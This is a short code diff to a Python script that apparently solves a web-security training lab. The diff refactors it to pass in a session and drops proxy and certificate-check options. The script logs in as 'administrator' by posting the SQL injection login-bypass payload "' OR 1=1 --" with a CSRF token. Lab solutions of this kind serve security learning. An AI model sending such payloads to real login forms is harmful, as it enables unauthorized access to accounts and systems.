@@ -5,9 +5,9 @@ from urllib.parse import urljoin
 import requests
 
 
-def solve_lab(url, proxies):
+def solve_lab(s, url):
     url = urljoin(url, "/login")
-    s, csrf = get_csrf_token(url, proxies=proxies)
+    csrf = get_csrf_token(s, url)
 
     data = {"csrf": csrf, "username": "administrator", "password": "' OR 1=1 --"}
     print_info(
@@ -17,8 +17,6 @@ def solve_lab(url, proxies):
 
     resp = s.post(
         url,
-        proxies=proxies,
-        verify=False,
         data=data,
     )
     print_success("SQL injection attack performed.\n")
